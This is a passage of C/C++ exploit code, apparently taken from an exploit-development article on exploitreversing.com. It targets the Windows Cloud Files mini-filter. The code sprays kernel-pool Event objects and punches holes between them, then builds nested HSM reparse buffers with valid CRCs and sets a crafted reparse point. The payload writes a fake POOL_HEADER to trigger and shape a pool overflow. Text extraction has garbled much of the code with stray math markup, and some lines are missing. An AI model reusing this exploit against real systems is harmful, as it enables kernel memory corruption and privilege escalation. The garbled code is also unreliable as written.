for (int $\\begin{array} { r l r } { \\dot { { \\bf \\varphi } } } & { { } = } & { { \\bf \\varphi } \\odot } \\end{array}$ ; i < count; i++) { printf(" \[-\] elements\[%d\]: type $=$ 0x%02X len $=$ %u off $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ 0x%X\\n", i, elements\[i\].Type, elements\[i\].Length, elements\[i\].Offset); } }\
\
static void ValidateFeRp(const char\* buffer\_ferp, int count, const HSM\_ELEMENT\_INFO\*\
\
elements, unsigned short totalSize) { printf("\[+\] FeRp header:\\n"); printf(" \[-\] $+ \\odot \\Theta$ : version=0x%04X\\n", $\\star$ (const USHORT\*)(buffer\_ferp +\
\
FERP\_VERSION)); printf(" \[-\] $+ \\odot 2$ : structSize $=$ %u\\n", $\\star$ (const USHORT $\\star$ )(buffer\_ferp +\
\
FERP\_STRUCT\_SIZE)); printf(" \[-\] $+ \\odot 4$ : magi $C = \\Theta \\times \_ { ^ { \\prime 0 } } ^ { 0 \\prime } \\Theta \\Theta \\times$ \\n", $\\star$ (const UINT\*)(buffer\_ferp $^ +$ FERP\_MAGIC)); printf(" \[-\] $+ \\odot 8$ : $\\mathsf { C } \\mathsf { r } \\mathsf { C } = \\odot \\times \_ { \\prime 0 } ^ { 0 \\prime } \\odot & \\times \\mathsf { \\Omega } \\backslash \\mathsf { n } ^ { \\prime }$ ", $\\star$ (const UINT\*)(buffer\_ferp $^ +$ FERP\_CRC)); printf(" \[-\] $+ \\odot \\zeta$ : dwordLen $=$ %u\\n", \*(const UINT\*)(buffer\_ferp $^ +$ FERP\_LENGTH)); printf(" \[-\] $+ 1 9$ : $= { \\sf { T a g s } } = \\Theta \\times \_ { \\prime 0 } ^ { 0 \\prime } \\Theta 4 \\sf { X } \\sin ^ { \\prime \\prime }$ , $\\star$ (const USHORT\*)(buffer\_ferp $^ +$ FERP\_FLAGS)); printf(" \[-\] $+ 1 2$ : max\_elements $=$ %u\\n", $\\star$ (const USHORT\*)(buffer\_ferp +\
\
FERP\_MAX\_ELEMS)); printf(" $\[ + \]$ Computed totalSize $=$ %u\\n", totalSize); USHORT base $=$ (USHORT)(HSM\_HEADER\_SIZE $^ +$ MAX\_ELEMS $\\star$ HSM\_ELEMENT\_INFO\_SIZE); printf("\\n\[+\] FeRpData base $= \\odot \\times \\mathrm { \_ { \\it { c 0 } } ^ { 0 \\prime } } \\mathrm { X }$ (reserved 10 descriptors)\\n", base); for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { printf(" \[-\] elements\[%d\]: type=0x%02X len $=$ %u off $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ 0x%X\\n", i, elements\[i\].Type, elements\[i\].Length, elements\[i\].Offset); }\
\
}\
\
tatic DWORD SprayEvents(HANDLE\* event\_array, DWORD count) { printf $( " \\setminus \\lbrack \\star \\rbrack$ STAGE 1: Spraying %lu Event objects...\\n", count); DWORD successful $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ count; $\\dot { 7 } + +$ ) { event\_array\[i\] $=$ CreateEventW( NULL, TRUE, FALSE, NULL ); if (event\_array\[i\] ! $=$ NULL) { successful++; } else { printf("\[-\] Failed to create Event %lu (Error: %lu)\\n", i, GetLastError()); } if ( $( \\dot { 7 } + 1 )$ ) % $1 \\Theta \\Theta \\Theta = \\Theta .$ ) { printf(" $\[ + \]$ Created %lu/%lu Events...\\n", i + 1, count); } }\
\
printf("\[+\] Successfully created %lu/%lu Event objects\\n", successful, count);\
\
return successful;\
\
static DWORD CreateHoles(HANDLE\* event\_array, DWORD count) { printf("\\n\[\*\] STAGE 2: Creating holes (freeing every other Event)...\\n"); DWORD freed $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ count; i $+ = ~ 2$ ) { if (event\_array\[i\] ! $=$ NULL) { CloseHandle(event\_array\[i\]); event\_array\[i\] $=$ NULL; freed $^ { + + }$ ; } } printf("\[+\] Freed %lu Event objects (created %lu holes)\\n", freed, freed); return freed;\
\
}\
\
static DWORD RefillWithTargets(HANDLE\* target\_array, DWORD count) { printf $( 1 1 ) \\setminus \[ \\star \]$ STAGE 3: Refilling holes with %lu target Events...\\n", count); DWORD successful $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ count; $\\dot { 7 } + +$ ) { target\_array\[i\] $=$ CreateEventW(NULL, TRUE, FALSE, NULL); if (target\_array\[i\] ! $=$ NULL) { successful++; } if ((i + 1) % $5 \\odot \\odot \ = \ \\odot ,$ ) { printf(" $\[ + \]$ Created %lu/%lu target Events...\\n", i + 1, count); } } printf(" $\[ + \]$ Successfully created %lu/%lu target Event objects\\n", successful,\
\
count); return successful;\
\
}\
\
static void CleanupEvents(HANDLE $\\star$ event\_array, DWORD count) { printf("\\n\[\*\] Cleaning up Event handles...\\n"); DWORD closed $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; for (DWORD i $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; i $\\angle$ count; $\\dot { 7 } + +$ ) { if (event\_array\[i\] ! $=$ NULL) { CloseHandle(event\_array\[i\]); event\_array\[i\] $=$ NULL; closed $^ { + + }$ ; } } printf("\[+\] Closed %lu Event handles\\n", closed);\
\
}\
\
static USHORT BtRpBuildBuffer( HSM\_ELEMENT\_INFO $\\star$ elements,\
\
[https://exploitreversing.com](https://exploitreversing.com/) char\*\* input\_data, int count, char\* btrp\_data\_buffer\
\
) { memset(btrp\_data\_buffer, 0, BTRP\_BUFFER\_SIZE); $\\star ( { \\sf U L O N G } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_MAGIC) $=$ HSM\_BITMAP\_MAGIC; $\\star ( \\mathsf { U S H O R T } \\star$ )(btrp\_data\_buffer $^ +$ BTRP\_MAX\_ELEMS) $=$ (USHORT)count; char $\\star$ ptr $=$ btrp\_data\_buffer $^ +$ HSM\_HEADER\_SIZE; for (int $\\begin{array} { r l r } { \\dot { { \\bf \\varphi } } } & { { } = } & { { \\bf \\varphi } \\odot } \\end{array}$ ; i $\\textless$ count; i++) { $\\star ( \\mathsf { U S H O R T } \\star )$ )(ptr $^ +$ ELEM\_TYPE) $=$ elements\[i\].Type; $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ )(ptr $^ +$ ELEM\_LENGTH) $=$ elements\[i\].Length; $\\star ( { \\sf U L O N G } \\star )$ )(ptr $^ +$ ELEM\_OFFSET) $=$ elements\[i\].Offset; memcpy(btrp\_data\_buffer $^ +$ elements\[i\].Offset + 4, input\_data\[i\], elements\[i\].Length); ptr $+ =$ sizeof(HSM\_ELEMENT\_INFO); } USHORT max\_offset $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { USHORT end $=$ (USHORT)(elements\[i\].Offset $^ +$ elements\[i\].Length); if (end $>$ max\_offset) { max\_offset $=$ end; } } USHORT total $=$ (USHORT)(max\_offset + 4); $\\star$ (USHORT\*)(btrp\_data\_buffer $^ +$ BTRP\_LENGTH) $=$ total; $\\star ( \\mathsf { U S H O R T } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_FLAGS) $=$ HSM\_DATA\_HAVE\_CRC; if (total $< = ~ 8 ~ + ~ 0 { \\times } \\odot .$ ) { printf("\[-\] BtRp size too small for CRC calc: 0x%X\\n", total); return 0; } ULONG crc\_len $=$ (ULONG)(total - 8); ULONG crc $=$ Calculate\_CRC32(0, btrp\_data\_buffer $^ +$ BTRP\_LENGTH, crc\_len); $\\star ( { \\sf U L O N G } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_CRC) $=$ crc; return total;\
\
}\
\
static USHORT FeRpBuildBuffer( HSM\_ELEMENT\_INFO\* elements, char\*\* input\_data, int count, char\* ferp\_ptr, USHORT max\_elements\
\
) { memset(ferp\_ptr, 0, FERP\_BUFFER\_SIZE); \*(USHORT\*)(ferp\_ptr $^ +$ FERP\_VERSION) $=$ VERSION\_VALUE; \*(USHORT\*)(ferp\_ptr $^ +$ FERP\_STRUCT\_SIZE) $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; \*(ULONG\*)(ferp\_ptr $^ +$ FERP\_MAGIC) $=$ HSM\_FILE\_MAGIC; \*(ULONG\*)(ferp\_ptr $^ +$ FERP\_LENGTH) $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; \*(USHORT\*)(ferp\_ptr $^ +$ FERP\_FLAGS) $=$ HSM\_DATA\_HAVE\_CRC; $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ (ferp\_ptr $^ +$ FERP\_MAX\_ELEMS) $=$ max\_elements; char\* descPtr $=$ ferp\_ptr $^ +$ HSM\_HEADER\_SIZE; for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { $\\star ( \\mathsf { U S H O R T } \\star )$ )(descPtr $^ +$ ELEM\_TYPE) $=$ elements\[i\].Type; $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ (descPtr $^ +$ ELEM\_LENGTH) $=$ elements\[i\].Length; $\\star ( { \\sf U L O N G } \\star )$ )(descPtr $^ +$ ELEM\_OFFSET) $=$ elements\[i\].Offset; memcpy(ferp\_ptr $^ +$ elements\[i\].Offset, input\_data\[i\], elements\[i\].Length); descPtr $+ =$ HSM\_ELEMENT\_INFO\_SIZE; } USHORT position\_limit $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i < count; $\\dot { 7 } + +$ ) { USHORT end $=$ (USHORT)(elements\[i\].Offset $^ +$ elements\[i\].Length); if (end $>$ position\_limit) { position\_limit $=$ end; } } USHORT rem $=$ (USHORT)(position\_limit % FERP\_ALIGN); if (rem ! $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ) { position\_limit $=$ (USHORT)(position\_limit $^ +$ (FERP\_ALIGN - rem)); } $\\star ( { \\sf U L O N G } \\star )$ )(ferp\_ptr $^ +$ FERP\_LENGTH) $=$ (ULONG)(position\_limit - 4); if (position\_limit $< =$ HSM\_ELEMENT\_TYPE\_MAX) { printf("\[-\] FeRp position\_limit too small: 0x%X\\n", position\_limit); return 0; } ULONG crc\_len $=$ (ULONG)(position\_limit - 8 - 4); ULONG crc $=$ Calculate\_CRC32(0, ferp\_ptr $^ +$ FERP\_LENGTH, crc\_len); $\\star ( { \\sf U L O N G } \\star )$ )(ferp\_ptr $^ +$ FERP\_CRC) $=$ crc; \*(USHORT $\\star$ )(ferp\_ptr $^ +$ FERP\_STRUCT\_SIZE) $=$ position\_limit; return position\_limit;\
\
}\
\
typedef NTSTATUS(NTAPI $\\star$ PRtlGetCompressionWorkSpaceSize)( USHORT, PULONG, PULONG);\
\
typedef NTSTATUS(NTAPI\* PRtlCompressBuffer)( USHORT, PUCHAR, ULONG,\
\
[https://exploitreversing.com](https://exploitreversing.com/) PUCHAR, ULONG, ULONG, PULONG, PVOID);\
\
static unsigned long FeRpCompressBuffer(char\* input\_buffer, unsigned short input\_size,\
\
char\* output\_buffer) { HMODULE h\_Ntdll $=$ LoadLibraryW(L"ntdll.dll"); if (!h\_Ntdll) return 0; auto h\_CompressionWSS $=$ (PRtlGetCompressionWorkSpaceSize)GetProcAddress(h\_Ntdll,\
\
"RtlGetCompressionWorkSpaceSize"); auto h\_CompressBuffer $=$ (PRtlCompressBuffer)GetProcAddress(h\_Ntdll,\
\
"RtlCompressBuffer"); if (!h\_CompressionWSS \|\| !h\_CompressBuffer) { FreeLibrary(h\_Ntdll); return 0; } ULONG ws1 $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ , $\\mathsf { w } \\mathsf { s } 2 \\mathrm { ~ ~ { ~ = ~ \\mathrm { ~ \\odot ~ } ~ } ~ }$ ; if (h\_CompressionWSS(2, &ws1, &ws2) != 0) { FreeLibrary(h\_Ntdll); return 0; } std::unique\_ptr<char\[\]> workspace(new char\[ws1\]); ULONG finalCompressedSize $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; NTSTATUS st $=$ h\_CompressBuffer( 2, (PUCHAR)(input\_buffer $^ +$ 4), (ULONG)(input\_size - 4), (PUCHAR)output\_buffer, (ULONG)FERP\_BUFFER\_SIZE, FERP\_BUFFER\_SIZE, &finalCompressedSize, workspace.get() ); FreeLibrary(h\_Ntdll); if (st ! $=$ 0) return 0; return finalCompressedSize;\
\
}\
\
static int BuildAndSetCloudFilesReparsePoint(HANDLE hFile, int payload\_size, char\*\
\
payload\_buf) {\
\
const int BT\_COUNT $=$ ELEMENT\_NUMBER;\
\
auto bt\_elements $=$ std::make\_unique<HSM\_ELEMENT\_INFO\[\] $>$ (BT\_COUNT); bt\_elements\[0\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
bt\_elements\[0\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
bt\_elements\[1\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
bt\_elements\[1\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
bt\_elements\[2\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
bt\_elements\[2\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
bt\_elements\[3\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT64;\
\
bt\_elements\[3\].Length $ \\quad = \\quad \\odot \\times 8 \\quad$ ;\
\
bt\_elements\[4\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP;\
\
bt\_elements\[4\].Length $=$ (USHORT)payload\_size;\
\
bt\_elements\[0\].Offset $=$ ELEMENT\_START\_OFFSET;\
\
bt\_elements\[1\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ;\
\
bt\_elements\[2\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ ;\
\
bt\_elements\[3\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ;\
\
bt\_elements\[4\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\bot 8$ ; std::unique\_ptr<char\[\]> bt\_buf(new char\[BTRP\_BUFFER\_SIZE\]);\
\
memset(bt\_buf.get(), 0, BTRP\_BUFFER\_SIZE); BYTE bt\_data\_00 = $\\Theta \\times \\Theta 1$ ;\
\
BYTE bt\_data\_01 = $\\Theta \\times \\Theta 1$ ;\
\
BYTE bt\_data\_02 = $\\Theta \\times \\Theta \\Theta$ ;\
\
UINT64 bt\_data\_03 $=$ $\\Theta \\times$ ABCDABCDABCDABCD;\
\
char\* bt\_data\[BT\_COUNT\] $=$ { (char\*)&bt\_data\_00, (char $\\star$ )&bt\_data\_01, (char\*)&bt\_data\_02, (char\*)&bt\_data\_03, payload\_buf\
\
};\
\
USHORT bt\_buffer\_size $=$ BtRpBuildBuffer(bt\_elements.get(), bt\_data, BT\_COUNT, bt\_buf.get()); if (bt\_buffer\_size $\\begin{array} { r l } { \\mathbf { \\Sigma } = = } & { { } \\odot } \\end{array}$ ) { printf("\[-\] BtRpBuildBuffer failed\\n"); return -1; }\
\
printf("\[+\] BtBufferSize: $\\Theta \\times \_ { ^ { \\prime 0 } } ^ { 0 \\prime } \\Theta 4 \\times \\sin ^ { \\prime \\prime }$ , bt\_buffer\_size);\
\
ValidateBtRp(bt\_buf.get(), BT\_COUNT, bt\_elements.get(), bt\_buffer\_size); const int FE\_COUNT $=$ ELEMENT\_NUMBER;\
\
auto fe\_elements $=$ std::make\_unique<HSM\_ELEMENT\_INFO\[\]>(FE\_COUNT); fe\_elements\[0\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
fe\_elements\[0\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
fe\_elements\[1\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT32;\
\
fe\_elements\[1\].Length $= ~ \\odot \\times 4$ ;\
\
fe\_elements\[2\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT64;\
\
fe\_elements\[2\].Length $ \\quad = \\quad \\odot \\times 8 \\quad$ ;\
\
fe\_elements\[3\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP;\
\
fe\_elements\[3\].Length $= ~ \\odot \\times 4$ ;\
\
fe\_elements\[4\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP;\
\
fe\_elements\[4\].Length $=$ bt\_buffer\_size; fe\_elements\[0\].Offset $=$ ELEMENT\_START\_OFFSET;\
\
fe\_elements\[1\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ;\
\
fe\_elements\[2\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ ;\
\
fe\_elements\[3\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ;\
\
fe\_elements\[4\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\bot 8$ ; std::unique\_ptr<char\[\]> fe\_buf(new char\[FERP\_BUFFER\_SIZE\]);\
\
memset(fe\_buf.get(), 0, FERP\_BUFFER\_SIZE); BYTE fe\_data\_00 = $\\Theta \\times 9 9$ ;\
\
UINT32 fe\_data\_01 $=$ 0x00000001;\
\
UINT64 fe\_data\_02 $=$ 0x0000000000000001; UINT32 fe\_data\_03 $=$ 0x00000033; char\* fe\_data\[FE\_COUNT\] $=$ { (char\*)&fe\_data\_00, (char\*)&fe\_data\_01, (char\*)&fe\_data\_02, (char\*)&fe\_data\_03, bt\_buf.get() }; USHORT fe\_size $=$ FeRpBuildBuffer(fe\_elements.get(), fe\_data, FE\_COUNT, fe\_buf.get(), MAX\_ELEMS); if (fe\_size $= =$ 0) { printf("\[-\] FeRpBuildBuffer failed\\n"); return -1; } printf("\\n\[+\] FeRp size: 0x%04X\\n", fe\_size); ValidateFeRp(fe\_buf.get(), FE\_COUNT, fe\_elements.get(), fe\_size); std::unique\_ptr<char\[\]> compressed(new char\[COMPRESSED\_SIZE\]); memset(compressed.get(), 0, COMPRESSED\_SIZE); unsigned long compressed\_size $=$ FeRpCompressBuffer(fe\_buf.get(), fe\_size, compressed.get()); if (compressed\_size == 0 \|\| compressed\_size $>$ COMPRESSED\_SIZE) { printf("\[-\] Compression failed or output too large (%lu bytes)\\n", compressed\_size); return -1; } printf("\[+\] Compressed FeRp size: $\\Theta \\times { } \_ { \\prime 0 } ^ { 0 \\prime }$ lX\\n", compressed\_size); USHORT cf\_payload\_len $=$ (USHORT)(4 $^ +$ compressed\_size); std::unique\_ptr<char\[\]> cf\_blob(new char\[cf\_payload\_len\]); memset(cf\_blob.get(), 0, cf\_payload\_len); $\\star$ (USHORT\*)(cf\_blob.get() + 0) $=$ $\\Theta \\times 8 \\Theta \\Theta 1$ ; \*(USHORT $\\star$ )(cf\_blob.get() + 2) $=$ fe\_size; memcpy(cf\_blob.get() + 4, compressed.get(), compressed\_size); REPARSE\_DATA\_BUFFER\_EX rep\_data\_buffer\_ex{}; rep\_data\_buffer\_ex.Flags $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ; rep\_data\_buffer\_ex.ExistingReparseTag $=$ IO\_REPARSE\_TAG\_CLOUD\_6; rep\_data\_buffer\_ex.ExistingReparseGuid $=$ ProviderId; rep\_data\_buffer\_ex.Reserved $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; rep\_data\_buffer\_ex.ReparseDataBuffer.ReparseTag $=$ IO\_REPARSE\_TAG\_CLOUD\_6; rep\_data\_buffer\_ex.ReparseDataBuffer.ReparseDataLength $=$ cf\_payload\_len; rep\_data\_buffer\_ex.ReparseDataBuffer.Reserved $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; memcpy(rep\_data\_buffer\_ex.ReparseDataBuffer.GenericReparseBuffer.DataBuffer, cf\_blob.get(), cf\_payload\_len);\
\
offsetof(REPARSE\_DATA\_BUFFER\_EX, ReparseDataBuffer.GenericReparseBuffer.DataBuffer) + cf\_payload\_len );\
\
&rep\_data\_buffer\_ex, inSize, NULL, 0, &bytesReturned, NULL ); if (!ok) { printf("\[-\] FSCTL\_SET\_REPARSE\_POINT\_EX failed! error $=$ %lu\\n", GetLastError()); return -1; } printf("\\n\[+\] DeviceIoControl (FSCTL\_SET\_REPARSE\_POINT\_EX) succeeded (file)\\n"); std::unique\_ptr<BYTE\[\] $>$ q(new BYTE\[REPARSE\_DATA\_SIZE\]); DWORD outBytes $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; if (DeviceIoControl(hFile, FSCTL\_GET\_REPARSE\_POINT, NULL, 0, q.get(),\
\
REPARSE\_DATA\_SIZE, &outBytes, NULL)) { auto reparsepoint $=$ reinterpret\_cast(q.get()); printf("\[+\] GET\_REPARSE (file): t $\\mathrm { \\partial } \\cdot \\mathrm { \\partial } \\mathrm { g } { = } \\Theta \\times \_ { \\mathrm { \\ell { 0 } } } ^ { 0 \\prime } \\Theta 8 \\mathrm { \\ell } \\mathrm { l } \\times$ , len $= % 1$ , total $=$ %lu\\n", reparsepoint->ReparseTag, reparsepoint->ReparseDataLength, (unsigned\
\
long)outBytes); } else { printf("\[-\] GET\_REPARSE (file) failed: %lu\\n", GetLastError()); } return 0;\
\
}\
\
int wmain(void) { PWSTR appDataPath $=$ NULL; HRESULT hrPath $=$ SHGetKnownFolderPath(FOLDERID\_RoamingAppData, 0, NULL,\
\
&appDataPath); if (FAILED(hrPath)) { wprintf(L"Failed to resolve %%APPDATA%%. HRESULT: 0x%08lX\\n", (unsigned\
\
long)hrPath); return -1; } wchar\_t syncRootPath\[MAX\_PATH\]; swprintf(syncRootPath, MAX\_PATH, L"%s\\MySyncRoot", appDataPath); CreateDirectoryW(syncRootPath, NULL); wprintf(L"\[+\] Sync root directory ensured: %s\\n", syncRootPath); LPCWSTR identityStr $=$ L"Alexandre"; CF\_SYNC\_REGISTRATION registration{}; registration.StructSize $=$ sizeof(registration); registration.ProviderName $=$ L"ExploitReversing"; registration.ProviderVersion $=$ L"1.0.0"; registration.ProviderId $=$ ProviderId; registration.SyncRootIdentity $=$ identityStr; registration.SyncRootIdentityLength $=$ (ULONG)(lstrlenW(identityStr) \*\
\
sizeof(WCHAR)); CF\_SYNC\_POLICIES policies{}; policies.StructSize $=$ sizeof(policies); policies.Hydration.Primary $=$ CF\_HYDRATION\_POLICY\_FULL; policies.Population.Primary $=$ CF\_POPULATION\_POLICY\_PARTIAL; policies.HardLink $=$ CF\_HARDLINK\_POLICY\_ALLOWED; policies.PlaceholderManagement $=$\
\
CF\_PLACEHOLDER\_MANAGEMENT\_POLICY\_UPDATE\_UNRESTRICTED; HRESULT hrReg $=$ CfRegisterSyncRoot(syncRootPath, &registration, &policies, CF\_REGISTER\_FLAG\_DISABLE\_ON\_DEMAND\_POPULATION\_ON\_ROOT); if (FAILED(hrReg)) { wprintf(L"\[-\] Sync root registration failed: 0x%08lX\\n", (unsigned long)hrReg); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[+\] Sync root registered at %s\\n", syncRootPath); auto spray\_events $=$ std::make\_unique<HANDLE\[\] $>$ (SPRAY\_COUNT); auto target\_events $=$ std::make\_unique<HANDLE\[\]>(TARGET\_COUNT); memset(spray\_events.get(), 0, SPRAY\_COUNT $\\star$ sizeof(HANDLE)); memset(target\_events.get(), 0, TARGET\_COUNT $\\star$ sizeof(HANDLE)); DWORD sprayed $=$ SprayEvents(spray\_events.get(), SPRAY\_COUNT); if (sprayed $\\textless$ SPRAY\_COUNT / 2) { printf("\[-\] Failed to spray enough Events (only %lu/%lu)\\n", sprayed,\
\
SPRAY\_COUNT); CleanupEvents(spray\_events.get(), SPRAY\_COUNT); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1; } DWORD holes $=$ CreateHoles(spray\_events.get(), SPRAY\_COUNT); printf("\[+\] Pool now has %lu holes ready for overflow buffer\\n", holes); printf("\\n\[\*\] Waiting 2 seconds for pool to stabilize...\\n"); Sleep(2000); wchar\_t filePath\[MAX\_PATH\]; swprintf(filePath, MAX\_PATH, L"%s\\ers06", syncRootPath); DWORD attrs $=$ GetFileAttributesW(filePath); if (attrs ! $=$ INVALID\_FILE\_ATTRIBUTES) { SetFileAttributesW(filePath, FILE\_ATTRIBUTE\_NORMAL); if (!DeleteFileW(filePath)) { wprintf(L"\[-\] Failed to delete existing file: %s (Error %lu)\\n", filePath, GetLastError());\
\
CleanupEvents(spray\_events.get(), SPRAY\_COUNT); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[i\] $\\mathsf { E x }$ isting file deleted: %s\\n", filePath); } HANDLE hFile $=$ CreateFileW( filePath, GENERIC\_ALL, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE, NULL, CREATE\_NEW, FILE\_ATTRIBUTE\_NORMAL, NULL ); if (hFile $= =$ INVALID\_HANDLE\_VALUE) { wprintf(L"\[-\] Failed to create file: %s (Error %lu)\\n", filePath, GetLastError()); CleanupEvents(spray\_events.get(), SPRAY\_COUNT); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[+\] File created: %s\\n", filePath); printf("\\n\[\*\] Crafting payload with EXTENDED pool header for overlap...\\n"); std::unique\_ptr<char\[\]> payload(new char\[REPARSE\_DATA\_SIZE\]); memset(payload.get(), 0, REPARSE\_DATA\_SIZE); memset(payload.get(), PAYLOAD\_INITIAL\_BYTE, $\\Theta \\times \\mathsf { F } \\mathsf { F } ( \\cdot \\mathsf { O }$ ); printf("\\n\[\*\] Placing corruption markers at offset 0xFF0:\\n"); $\\star$ (ULONG64\*)(payload.get() $^ +$ 0xFF0) $=$ $\\Theta \\times$ DEADBEEFDEADBEEF; $\\star$ (ULONG64\*)(payload.get() $^ +$ 0xFF8) $=$ 0x1234567812345678; printf("\[+\] Crafting fake POOL\_HEADER at offset $\\Theta \\times \_ { / 0 } ^ { 0 / } \\Theta 4 \\times : \\left. \\mathsf { n } ^ { \\prime \\prime } \\right.$ , PAYLOAD\_OFFSET); $\\star$ (BYTE\*)(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta \\Theta$ ) $\\begin{array} { r l } { = } & { { } \\odot \\times \\odot 4 } \\end{array}$ ; $\\star$ (BYTE\*)(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta \ I \\rvert$ ) = $\\Theta \\times \\Theta \\Theta$ ; $\\star$ (BYTE\*)(payload.get() $^ +$ PAYLOAD\_OFFSET + $\\Theta \\times \\Theta 2$ ) = $\\Theta \\times 1 0$ ; $\\star$ (BYTE\*)(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta 3$ ) $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ $\\Theta \\times \\Theta 2$ ; $\\star$ (ULONG\*)(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ) $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ 0x6e657645; \*(ULONG64\*)(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ ) $=$ $\\Theta \\times$ 4141414141414141; printf(" \[\*\] PreviousSize: $\\Theta \\times \\Theta 4 \\setminus \\left. { 1 1 } \\right)$ ); printf(" $\[ \\star \]$ PoolIndex: $\\Theta \\times \\Theta \\odot \\setminus \\mathfrak { n } ^ { \\prime \\prime } ,$ ); printf(" $\[ \\star \]$ BlockSize: $\\Theta \\times \\bot \\Theta$ (size $=$ $\\Theta \\times \\bot \\Theta$ $\\star$ 0x10 = $\\Theta \\times \\bot \\Theta \\Theta$ bytes)\\n"); printf(" $\[ \\star \]$ PoolType: $\\Theta \\times \\Theta 2$ (NonPagedPool)\\n"); printf(" \[\*\] PoolTag: $\\Theta \\times$ 6e657645 ('Even')\\n"); printf(" $\[ \\star \]$ ProcessBilled: $\\Theta \\times$ 4141414141414141 (marker)\\n"); printf("\\n\[+\] Fake header written at $r ( \\mathsf { C } \\mathsf { X } + \\odot \\mathsf { X } \\bot \\odot \\odot \\odot \\setminus \\mathsf { n } ^ { \\prime \\prime } )$ ; 